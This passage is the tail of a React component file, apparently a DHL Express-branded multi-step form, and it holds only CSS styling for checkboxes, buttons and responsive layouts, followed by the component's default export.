        [dir="rtl"] .dhl-checkbox-row {
          flex-direction: row-reverse;
        }

        .dhl-checkbox {
          width: 18px;
          height: 18px;
          margin-top: 2px;
          cursor: pointer;
          flex-shrink: 0;
        }

        .dhl-checkbox-label {
          font-size: 14px;
          color: #333;
          line-height: 1.4;
          flex: 1;
        }

        .dhl-link {
          color: #d40511;
          text-decoration: underline;
          cursor: pointer;
        }

        .dhl-next-btn {
          display: block;
          width: 100%;
          padding: 15px;
          margin-top: 10px;
          background: #d40511;
          color: #fff;
          font-size: 17px;
          font-weight: 700;
          text-align: center;
          border: none;
          border-radius: 8px;
          cursor: pointer;
          box-sizing: border-box;
          font-family: inherit;
          transition: background 0.2s, transform 0.1s;
        }

        .dhl-next-btn:hover {
          background: #b00410;
          transform: translateY(-1px);
        }

        @media (max-width: 768px) {
          .dhl-steps-container {
            padding-top: 60px;
          }
          .dhl-form-card {
            margin: 0 16px 60px 16px;
            padding: 24px 20px;
          }
          .dhl-row {
            flex-direction: column;
            gap: 16px;
          }
          .dhl-col {
            width: 100%;
          }
          .dhl-header-content {
            padding: 0 20px;
          }
        }

        @media (max-width: 640px) {
          .dhl-steps-container {
            padding-top: 50px;
          }
          .dhl-steps {
            flex-wrap: wrap;
            justify-content: center;
            gap: 12px;
          }
          .dhl-step-line {
            display: none;
          }
          .dhl-form-card {
            margin: 0 12px 40px 12px;
            padding: 20px 16px;
          }
          .dhl-form-title {
            font-size: 24px;
          }
          .dhl-input {
            height: 44px;
            font-size: 14px;
          }
          .dhl-next-btn {
            padding: 14px;
            font-size: 16px;
          }
        }

        @media (max-width: 480px) {
          .dhl-lang-name {
            display: none;
          }
          .dhl-lang-btn {
            padding: 8px 10px;
          }
          .dhl-logo {
            max-height: 40px;
          }
          .dhl-header {
            padding: 20px 0;
          }
          .dhl-steps-container {
            padding-top: 40px;
          }
          .dhl-form-card {
            margin: 0 10px 30px 10px;
            padding: 18px 14px;
          }
          .dhl-form-title {
            font-size: 22px;
          }
          .dhl-label {
            font-size: 12px;
          }
          .dhl-input {
            height: 42px;
            font-size: 13px;
          }
          .dhl-next-btn {
            padding: 12px;
            font-size: 15px;
          }
        }
      `}</style>
    </div>
  );
};

export default DHLExpressForm;